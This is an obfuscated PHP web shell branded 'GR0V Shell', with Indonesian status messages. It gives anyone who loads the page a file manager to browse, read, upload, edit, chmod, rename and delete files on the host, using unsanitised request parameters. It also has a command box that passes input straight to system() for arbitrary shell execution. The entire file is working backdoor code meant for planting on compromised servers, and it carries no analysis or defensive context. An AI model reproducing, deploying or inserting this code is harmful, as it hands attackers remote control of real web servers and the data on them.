<?php

/*   __________________________________________________

    |  Obfuscated by YAK Pro - Php Obfuscator  2.0.14  |

    |              on 2024-03-22 08:03:34              |

    |    GitHub: https://github.com/pk-fr/yakpro-po    |

    |__________________________________________________|

*/

 goto Cf; b4: error_reporting(0); goto D6; Ca: ?>

<!DOCTYPE html>

<html>

<body bgcolor="white">

	<center>

<FORM METHOD="POST" NAME="myform" ACTION="">

<font color="lime">&nbsp;&nbsp;root-grov@<?php  goto a8; Ae: echo '<form enctype="multipart/form-data" method="POST">

<font color="white">File Upload :</font> <input type="file" name="file" />

<input type="submit" value="upload" />

</form>

</td></tr>'; goto c7; Ee: echo '<center><br/><font size="4">T1KUS90T</font></center>

</body>

</html>'; goto ea; d9: $paths = explode('/', $path); goto a7; ea: function perms($file) { goto B3; B3: $perms = fileperms($file); goto E6; C6: return $info; goto Bc; b9: $info .= $perms & 0x20 ? 'r' : '-'; goto cb; ce: $info .= $perms & 0x80 ? 'w' : '-'; goto B2; d6: $info .= $perms & 0x1 ? $perms & 0x200 ? 't' : 'x' : ($perms & 0x200 ? 'T' : '-'); goto C6; C3: $info .= $perms & 0x2 ? 'w' : '-'; goto d6; cb: $info .= $perms & 0x10 ? 'w' : '-'; goto fe; D0: $info .= $perms & 0x4 ? 'r' : '-'; goto C3; A2: $info .= $perms & 0x100 ? 'r' : '-'; goto ce; B2: $info .= $perms & 0x40 ? $perms & 0x800 ? 's' : 'x' : ($perms & 0x800 ? 'S' : '-'); goto b9; E6: if (($perms & 0xc000) == 0xc000) { $info = 's'; } elseif (($perms & 0xa000) == 0xa000) { $info = 'l'; } elseif (($perms & 0x8000) == 0x8000) { $info = '-'; } elseif (($perms & 0x6000) == 0x6000) { $info = 'b'; } elseif (($perms & 0x4000) == 0x4000) { $info = 'd'; } elseif (($perms & 0x2000) == 0x2000) { $info = 'c'; } elseif (($perms & 0x1000) == 0x1000) { $info = 'p'; } else { $info = 'u'; } goto A2; fe: $info .= $perms & 0x8 ? $perms & 0x400 ? 's' : 'x' : ($perms & 0x400 ? 'S' : '-'); goto D0; Bc: } goto Df; Df: $ip = gethostbyname($_SERVER['HTTP_HOST']); goto Ca; aa: if (get_magic_quotes_gpc()) { foreach ($_POST as $key => $value) { $_POST[$key] = stripslashes($value); } } goto Ec; a8: echo $ip; goto A6; E9: echo '</td></tr><tr><td>'; goto E7; D6: set_time_limit(0); goto aa; E7: if (isset($_FILES['file'])) { if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) { echo '<font color="green">Upload Berhasil</font><br />'; } else { echo '<font color="red">Upload Gagal</font><br/>'; } } goto Ae; e7: @ini_set('display_errors', 0); goto b4; a7: foreach ($paths as $id => $pat) { goto Fc; Fc: if ($pat == '' && $id == 0) { goto F6; F6: $a = true; goto af; C0: continue; goto Ad; af: echo '<a href="?path=/">/</a>'; goto C0; Ad: } goto c8; bd: echo '<a href="?path='; goto F9; F9: for ($i = 0; $i <= $id; $i++) { echo "{$paths[$i]}"; if ($i != $id) { echo "/"; } } goto Ff; c8: if ($pat == '') { continue; } goto bd; Ff: echo '">' . $pat . '</a>/'; goto ac; ac: } goto E9; Ec: echo '<!DOCTYPE HTML>

<html>

<head>

<link href="" rel="stylesheet" type="text/css">

<title>GR0V Shell</title>

<style>

body{

font-family: "Ice Land", cursive;

background-color: black;

color:white;

}

#content tr:hover{

background-color: blue;

text-shadow:0px 0px 10px #fff;

}

#content .first{

background-color: blue;

}

table{

border: 1px #000000 dotted;

}

a{

color:white;

text-decoration: none;

}

a:hover{

color:blue;

text-shadow:0px 0px 10px #ffffff;

}

input,select,textarea{

border: 1px #000000 solid;

-moz-border-radius: 5px;

-webkit-border-radius:5px;

border-radius:5px;

}

</style>

</head>

<body>

<h1><center><font color="blue">GR0V shell</font></center></h1>

<font color="green"><center>' . php_uname() . '</center></font><br>

<table width="700" border="0" cellpadding="3" cellspacing="1" align="center">

<tr><td><font color="white">Path :</font> '; goto d3; Cf: @ini_set('output_buffering', 0); goto e7; d3: if (isset($_GET['path'])) { $path = $_GET['path']; } else { $path = getcwd(); } goto B4; B4: $path = str_replace('\\', '/', $path); goto d9; c7: if (isset($_GET['filesrc'])) { goto f4; F0: echo $_GET['filesrc']; goto bf; bf: echo '</tr></td></table><br />'; goto d8; f4: echo "<tr><td>Current File : "; goto F0; d8: echo '<pre>' . htmlspecialchars(file_get_contents($_GET['filesrc'])) . '</pre>'; goto E5; E5: } elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') { goto F5; Cd: echo '</center>'; goto fd; F5: echo '</table><br /><center>' . $_POST['path'] . '<br /><br />'; goto b0; b0: if ($_POST['opt'] == 'chmod') { if (isset($_POST['perm'])) { if (chmod($_POST['path'], $_POST['perm'])) { echo '<font color="green">Change Permission Berhasil</font><br/>'; } else { echo '<font color="red">Change Permission Gagal</font><br />'; } } echo '<form method="POST">

Permission : <input name="perm" type="text" size="4" value="' . substr(sprintf('%o', fileperms($_POST['path'])), -4) . '" />

<input type="hidden" name="path" value="' . $_POST['path'] . '">

<input type="hidden" name="opt" value="chmod">

<input type="submit" value="Go" />

</form>'; } elseif ($_POST['opt'] == 'rename') { if (isset($_POST['newname'])) { if (rename($_POST['path'], $path . '/' . $_POST['newname'])) { echo '<font color="green">Ganti Nama Berhasil</font><br/>'; } else { echo '<font color="red">Ganti Nama Gagal</font><br />'; } $_POST['name'] = $_POST['newname']; } echo '<form method="POST">

New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" />

<input type="hidden" name="path" value="' . $_POST['path'] . '">

<input type="hidden" name="opt" value="rename">

<input type="submit" value="Go" />

</form>'; } elseif ($_POST['opt'] == 'edit') { if (isset($_POST['src'])) { goto Bd; A3: if (fwrite($fp, $_POST['src'])) { echo '<font color="green">Berhasil Edit File</font><br/>'; } else { echo '<font color="red">Gagal Edit File</font><br/>'; } goto f9; Bd: $fp = fopen($_POST['path'], 'w'); goto A3; f9: fclose($fp); goto e0; e0: } echo '<form method="POST">

<textarea cols=80 rows=20 name="src">' . htmlspecialchars(file_get_contents($_POST['path'])) . '</textarea><br />

<input type="hidden" name="path" value="' . $_POST['path'] . '">

<input type="hidden" name="opt" value="edit">

<input type="submit" value="Save" />

</form>'; } goto Cd; fd: } else { goto fc; b1: $scandir = scandir($path); goto ef; fc: echo '</table><br/><center>'; goto D1; C9: foreach ($scandir as $dir) { goto Cb; e8: echo '<tr>

<td><a href="?path=' . $path . '/' . $dir . '">' . $dir . '</a></td>

<td><center>--</center></td>

<td><center>'; goto cc; bc: echo '</center></td>

<td><center><form method="POST" action="?option&path=' . $path . '">

<select name="opt">

<option value="">Select</option>

<option value="delete">Delete</option>

<option value="chmod">Chmod</option>

<option value="rename">Rename</option>

</select>

<input type="hidden" name="type" value="dir">

<input type="hidden" name="name" value="' . $dir . '">

<input type="hidden" name="path" value="' . $path . '/' . $dir . '">

<input type="submit" value=">">

</form></center></td>

</tr>'; goto B8; d0: echo perms($path . '/' . $dir); goto C2; C2: if (is_writable($path . '/' . $dir) || !is_readable($path . '/' . $dir)) { echo '</font>'; } goto bc; Cb: if (!is_dir($path . '/' . $dir) || $dir == '.' || $dir == '..') { continue; } goto e8; cc: if (is_writable($path . '/' . $dir)) { echo '<font color="green">'; } elseif (!is_readable($path . '/' . $dir)) { echo '<font color="red">'; } goto d0; B8: } goto f1; B7: foreach ($scandir as $file) { goto a4; a4: if (!is_file($path . '/' . $file)) { continue; } goto D3; D3: $size = filesize($path . '/' . $file) / 1024; goto ff; A8: if ($size >= 1024) { $size = round($size / 1024, 2) . ' MB'; } else { $size = $size . ' KB'; } goto A4; Ce: echo '</center></td>

<td><center><form method="POST" action="?option&path=' . $path . '">

<select name="opt">

<option value="">Select</option>

<option value="delete">Delete</option>

<option value="chmod">Chmod</option>

<option value="rename">Rename</option>

<option value="edit">Edit</option>

</select>

<input type="hidden" name="type" value="file">

<input type="hidden" name="name" value="' . $file . '">

<input type="hidden" name="path" value="' . $path . '/' . $file . '">

<input type="submit" value=">">

</form></center></td>

</tr>'; goto ae; D8: echo perms($path . '/' . $file); goto e5; e5: if (is_writable($path . '/' . $file) || !is_readable($path . '/' . $file)) { echo '</font>'; } goto Ce; ff: $size = round($size, 3); goto A8; c5: if (is_writable($path . '/' . $file)) { echo '<font color="green">'; } elseif (!is_readable($path . '/' . $file)) { echo '<font color="red">'; } goto D8; A4: echo '<tr>

<td><a href="?filesrc=' . $path . '/' . $file . '&path=' . $path . '">' . $file . '</a></td>

<td><center>' . $size . '</center></td>

<td><center>'; goto c5; ae: } goto C5; ef: echo '<div id="content"><table width="700" border="0" cellpadding="3" cellspacing="1" align="center">

<tr class="first">

<td><center>Name</peller></center></td>

<td><center>Size</peller></center></td>

<td><center>Permission</peller></center></td>

<td><center>Modify</peller></center></td>

</tr>'; goto C9; D1: if (isset($_GET['option']) && $_POST['opt'] == 'delete') { if ($_POST['type'] == 'dir') { if (rmdir($_POST['path'])) { echo '<font color="green">Directory Terhapus</font><br/>'; } else { echo '<font color="red">Directory Gagal Terhapus                                                                                                                                                                                                                                                                                             </font><br/>'; } } elseif ($_POST['type'] == 'file') { if (unlink($_POST['path'])) { echo '<font color="green">File Terhapus</font><br/>'; } else { echo '<font color="red">File Gagal Dihapus</font><br/>'; } } } goto B1; f1: echo '<tr class="first"><td></td><td></td><td></td><td></td></tr>'; goto B7; B1: echo '</center>'; goto b1; C5: echo '</table>

</div>'; goto E4; E4: } goto Ee; A6: ?>:~$ </font>

<INPUT TYPE="text" NAME="cmd">

<INPUT TYPE="submit" VALUE=">>">

</FORM>

<pre>

<?

if($_POST['cmd']) {

  system($_POST['cmd']);

  }

?>